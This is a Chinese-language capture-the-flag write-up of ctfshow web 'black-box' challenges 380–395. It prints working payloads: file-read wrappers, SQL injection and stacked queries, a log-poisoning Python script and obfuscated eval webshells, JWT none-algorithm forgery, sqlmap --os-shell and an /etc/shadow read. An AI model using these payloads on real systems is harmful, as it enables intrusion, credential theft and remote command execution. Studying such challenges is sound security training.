---
title: ctfshow-黑盒测试
id: ctfshow-黑盒测试
date: 2021-10-21 16:43:30
sidebar_position: 14
---

<!-- more -->

## 380 读文件

瞎点看到都是page_?.php的格式，尝试改成page.php（可以扫）

报错缺少id参数，那么get一个id进去

伪协议读个源码：`page.php?id=php://filter/convert.base64-encode/resource=page`

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-08 19:50:40
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-08 19:59:24
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


#error_reporting(0);
$id = $_GET['id'];
if(!isset($id)){
	die('打开$id.php失败');
}else{
	$html = file_get_contents($id.'.php');
	echo $html;
}
```

flag在flag.php：`page.php?id=flag`

## 381 后台路径

长得一样啊，再试试page.php，提示`打开page_$id.php失败`这样的字符拼接有点难办啦

看看别的地方，看到关键目录`alsckdfy`，访问即得flag

![](https://i.loli.net/2021/10/21/AwWNLUvu8txMI3E.png)

![](https://i.loli.net/2021/10/21/Kjf41CIdcoMpwFk.png)

## 382、383 弱口令 or 万能密码

还是后台地址`alsckdfy`，登录即得flag

1. sqlmap：`admin/admin888`，也可以弱口令字典爆破
2. 万能密码：`' or 'a'='a`

## 384 爆破

后台`alsckdfy`爆破：`密码前2位是小写字母，后三位是数字`

大概是676000分之一：`admin/xy123`

![](https://i.loli.net/2021/10/21/pdkHia2CAoqjcJ7.png)

## 385 重置密码

扫描得`/install`，如下访问之重置密码

![](https://i.loli.net/2021/10/21/YSJsu1VLa3OGiCb.png)

再去后台`alsckdfy`，`admin/admin888`登陆

## 386 lock.dat

扫描得：`clear.php`和`install`

访问`install`，提示lock.dat文件存在，就是上锁了不给重置。cms常见的手法

再看`clear.php`，盲猜file参数，试一下：`clear.php?file=page_1.php`

访问看到确实被删掉了
![](https://i.loli.net/2021/10/21/Mo5HIXEBtJRzwk8.png)

那么利用clear.php把lock.dat删掉，再install重置即可，再去后台`alsckdfy`，`admin/admin888`登陆

![](https://i.loli.net/2021/10/21/zQ4u9qNV5D3GcjW.png)

## 387 debug日志包含

> hint：前面部分和386一样

扫描得`/debug`和`/install`，访问install还是提示lock.dat，但是没有clear.php了

访问`/debug`说file not exit，给一个file参数![](https://i.loli.net/2021/10/21/8OTvVLs21jiFa6X.png)

读一下/etc/shadow试试![](https://i.loli.net/2021/10/21/hBJ6KIomfA1zeTc.png)

可以尝试一下日志包含；用的是nginx，日志路径为：`/var/log/nginx/access.log`

unlink把lock.dat删掉就行：

```php
<?php unlink('/var/www/html/install/lock.dat')?>
```

![](https://i.loli.net/2021/10/21/jwDT38HNXeKzp6t.png)

后续一样

![](https://i.loli.net/2021/10/21/6bSgeI9pAdQhmsY.png)

还看到bit师傅的做法，直接cat 后台check.php的源码到txt里，查看即可



## 388 editor(CVE-2017-1002024/免杀马)

扫出`/debug`、`/alsckdfy/editor/`

`/debug`结果如下，调试结果会被写到日志中。猜测是文件包含后再写到日志里

![](https://i.loli.net/2021/10/21/CAxQWtR5OmhFe2j.png)

再看`/alsckdfy/editor/`

在js看到编辑器版本信息KindEditor 4.1.11，
搜一下知道有个漏洞（CVE-2017-1002024）Kindeditor \<=4.1.11 上传漏洞

![](https://i.loli.net/2021/10/21/eGj3cyNdAJlZvtF.png)

访问`/alsckdfy/editor/`，随便传一个php看看白名单

![](https://i.loli.net/2021/10/21/P9J2x6wItvM3DLV.png)

因为对代码也有过滤，拼接绕过，然后放在txt里上传

```php
<?php
$a = '<?ph'.'p ev'.'al($_PO'.'ST[1]);?>';
file_put_contents('/var/www/html/1.php',$a);
?>
```

上传拿路径
![](https://i.loli.net/2021/10/21/ujafJmMhCzEPByb.png)



然后到`/debug`调试写到日志里

```
/debug/?file=/var/www/html/alsckdfy/attached/file/20211021/20211021065810_79266.txt
```

再文件包含日志，让马能成功写进去

```
/debug/?file=/var/log/nginx/access.log
```

然后访问马,读checke.php即可得到flag

![](https://i.loli.net/2021/10/21/c9dZWa62Unhkr7L.png)

非预期：日志包含写shell

feng师傅的做法

```python
import requests
import base64
url="http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/"
url2="http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/debug/?file=/var/log/nginx/access.log"
cmd=b"<?php eval($_POST[1]);?>"
cmd=base64.b64encode(cmd).decode()
headers={
	'User-Agent':'''<?php system('echo {0}|base64 -d  > /var/www/html/b.php');?>'''.format(cmd)
}
print(headers)
requests.get(url=url,headers=headers)
requests.get(url2)
print(requests.post(url+'b.php',data={'1':'system("cat alsckdfy/check.php");'}).text)


```



## 389 jwt session伪造

访问/debug，提示权限不足，看session，明显的jwt格式

![](https://i.loli.net/2021/10/21/fkE2QKzwLr36qmS.png)

![](https://i.loli.net/2021/10/21/q2L3BpAc7skE8uV.png)

c-jwt-cracker爆破得123456

```jwt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzNDc5OTkxNywiZXhwIjoxNjM0ODA3MTE3LCJuYmYiOjE2MzQ3OTk5MTcsInN1YiI6ImFkbWluIiwianRpIjoiMThhNDYzZDJjYTEyNmU3MGZhZmNmMjdhODc0ZjU3ZjAifQ.ZiQ4RvolefXr7HE2jbFhtFVl0VSSX8UhE4xjZ7_f83U
```

![](https://i.loli.net/2021/10/21/sFfcaxGlBigzAj1.png)

或者把加密算法改成none

```python
import jwt
token = jwt.encode(
{
  "iss": "admin",
  "iat": 1634799917,
  "exp": 1634807117,
  "nbf": 1634799917,
  "sub": "admin",
  "jti": "18a463d2ca126e70fafcf27a874f57f0"
},
algorithm="none",key=""
)

print(token.encode("utf-8").decode("utf-8"))

#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzNDc5OTkxNywiZXhwIjoxNjM0ODA3MTE3LCJuYmYiOjE2MzQ3OTk5MTcsInN1YiI6ImFkbWluIiwianRpIjoiMThhNDYzZDJjYTEyNmU3MGZhZmNmMjdhODc0ZjU3ZjAifQ.

```

![](https://i.loli.net/2021/10/21/Y8rdHGDCFXsQUvn.png)

后续同388

不过尝试的时候发现传txt再包含的话不太行--，又改成zip格式才成

## 390 sql注入 --os-shell

看网站url，改为用参数id控制了：`http://9b0ead93-149f-465a-9c86-2dacc9b75333.challenge.ctf.show/page.php?id=3`

sqlmap --os-shell

![](https://i.loli.net/2021/10/21/dH3QSFGqf5amKoJ.png)



## 391、392 sql注入 

注入点在`url/search.php?title=1`

继续sqlmap或者手注

391 flag在alsckdfy/check.php；392flag在根目录

```
/search.php?title=1' union select 1,substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255),3 limit 0,1%23
```

![](https://i.loli.net/2021/10/21/EbWaysgBi6S1tAw.png)

```
/search.php?title=1' union select 1,substr((select load_file('/flag')),1,255),3 limit 0,1%23
```

![](https://i.loli.net/2021/10/21/LhHsXmKIlT5BU4v.png)

## 393 堆叠

在最下面出现一个搜索引擎
![](https://i.loli.net/2021/10/21/u1DRkeN8ixaHQlT.png)
选择一个会出现：![](https://i.loli.net/2021/10/21/YneZ7Lwhz2SAGbk.png)

应当是把搜索引擎的链接放到了数据库里，不同链接对应不同的id

sqlmap一把梭，看一下数据库

```
sqlmap -u "http://808a6a22-0a64-443b-a58c-10ec2673c923.challenge.ctf.show/search.php?title=1" --dbms='mysql' --batch --dump
```



模仿yu师傅的做法
利用堆叠和file://把根目录下的flag内容写到数据库里：

```
/search.php?title=1';1';insert into link values(10,'a','file:///flag');
```

然后访问对应的id即可

![](https://i.loli.net/2021/10/21/ny1EJr4NpReD2Q5.png)

或者像bit师傅：

```
search.php?title=aa';update link set url='file:///flag';select1,2,'a
```

然后随便访问个id，就可得到flag



## 394 过滤，堆叠

> hint：FLAG_NOT_HERE

flag又跑到alsckdfy/check.php里啦，还是可以file://读，但是添加了过滤，可以用十六进制绕过

![](https://i.loli.net/2021/10/21/Qu3xCaFkb69VcBN.png)

```
/search.php?title=1';insert into link values(10,'a',0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);
```

然后访问`/link.php?id=10`

或

```
1';update link set url=0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870; 
```

然后随便访问个id，就可得到flag

## 395 gopher

同上，也可以像羽师傅的非预期：gopher打redis服务，fastcig

![](https://i.loli.net/2021/10/21/Di2yoOIKWXmUBcV.png)



## 参考文章

[CTFSHOW黑盒测试篇_羽的博客-CSDN博客_ctfshow 黑盒测试](https://blog.csdn.net/miuzzx/article/details/112522873)

[CTFshow---WEB入门---（黑盒测试）380-395 WP - Bit's Blog (xl-bit.cn)](https://www.xl-bit.cn/index.php/archives/22/)

[ctfshow-web入门-黑盒测试 | npfs's blog (npfs06.top)](https://npfs06.top/2021/10/13/ctfshow-web入门-黑盒测试/)

[ctfshow-黑盒测试 | 尘～落 (chenluo77.com)](http://chenluo77.com/2021/07/29/7734.html#toc-heading-10)
